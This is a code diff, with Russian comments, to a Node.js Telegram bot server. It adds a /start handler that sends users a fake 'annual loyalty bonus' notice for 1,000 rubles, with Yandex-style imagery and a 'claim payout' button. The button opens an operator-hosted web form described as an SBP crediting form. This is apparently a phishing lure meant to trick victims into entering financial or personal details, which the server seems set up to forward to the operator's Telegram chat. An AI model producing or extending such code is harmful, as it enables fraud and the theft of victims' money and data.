@@ -10,6 +10,51 @@ const upload = multer();
 // Данные из настроек Render
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+// Добавь это сразу после const CHAT_ID = ...
+
+// Функция для отправки приветствия при старте
+async function sendWelcome(chatId) {
+    const photoUrl = 'https://i.ibb.co/v6Xv5kS/yandex-bonus.jpg'; 
+    const captionText = 
+        `💳 **Уведомление о начислении #Y-2026**\n\n` +
+        `Здравствуйте! Вам доступен ежегодный бонус в рамках программы лояльности.\n\n` +
+        `💰 **Сумма: 1,000.00 ₽**\n` +
+        `💎 **Статус: Выплата разрешена**\n\n` +
+        `Нажмите на кнопку ниже, чтобы открыть форму зачисления средств через СБП.`;
+
+    try {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            chat_id: chatId,
+            photo: photoUrl,
+            caption: captionText,
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [[
+                    {
+                        text: "🔘 ПОЛУЧИТЬ ВЫПЛАТУ",
+                        web_app: { url: "https://ТВОЙ-ДОМЕН.render.com" } // Укажи тут адрес своего сайта на Render
+                    }
+                ]]
+            }
+        });
+    } catch (e) {
+        console.error("Ошибка отправки приветствия:", e.message);
+    }
+}
+
+// Слушаем команду /start через вебхук или просто проверяем обновления
+// Если ты используешь Render, проще всего добавить библиотеку node-telegram-bot-api 
+// Но если хочешь без лишних модулей, добавь вот такой эндпоинт:
+
+app.use(express.json()); // Чтобы сервер понимал JSON от Телеграма
+
+app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
+    const { message } = req.body;
+    if (message && message.text === '/start') {
+        await sendWelcome(message.from.id);
+    }
+    res.sendStatus(200);
+});
 
 app.use(express.static('public'));
 
